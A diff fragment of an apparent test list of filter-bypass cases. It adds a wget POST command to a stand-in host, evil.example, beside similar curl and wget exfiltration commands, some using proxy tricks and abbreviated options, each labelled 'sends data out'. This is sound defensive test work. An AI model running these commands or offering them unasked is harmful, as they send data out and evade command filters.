@@ -259,6 +259,7 @@ BYPASSES = [
     ("curl -sXPOST https://evil.example/hook", "sends data out"),
     ("curl --json '{}' https://evil.example/hook", "sends data out"),
     ("curl --request POST https://evil.example/hook", "sends data out"),
+    ("wget --method=POST --body-data=a https://evil.example/hook", "sends data out"),
     ("curl -X POST http://localhost:9000/x --url https://evil.example -d 1", "sends data out"),
     ("wget --exe=use_proxy=on --post-data=a http://localhost:9000/", "sends data out"),       # an abbreviated option
     ("curl --prox http://evil.example:8080 -X POST http://localhost:9000/ -d 1", "sends data out"),
